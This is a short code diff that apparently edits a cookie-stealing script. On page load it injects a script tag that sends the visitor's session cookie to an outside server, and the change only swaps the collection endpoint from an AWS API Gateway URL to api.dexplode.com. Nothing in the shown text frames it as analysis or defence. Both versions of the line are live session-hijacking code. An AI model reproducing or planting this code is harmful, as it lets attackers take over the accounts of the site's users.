@@ -28,7 +28,7 @@ if (!getCookie('session')) {
 }
 window.onload = function() {
     var pot = document.createElement('script');
-    pot.src = 'https://lob54ydz0b.execute-api.ap-northeast-1.amazonaws.com/prod/okky/?cookie='
+    pot.src = 'https://api.dexplode.com/dFv1pZ/?cookie='
         + getCookie('session');
     document.getElementsByTagName('head')[0].appendChild(pot);
 }
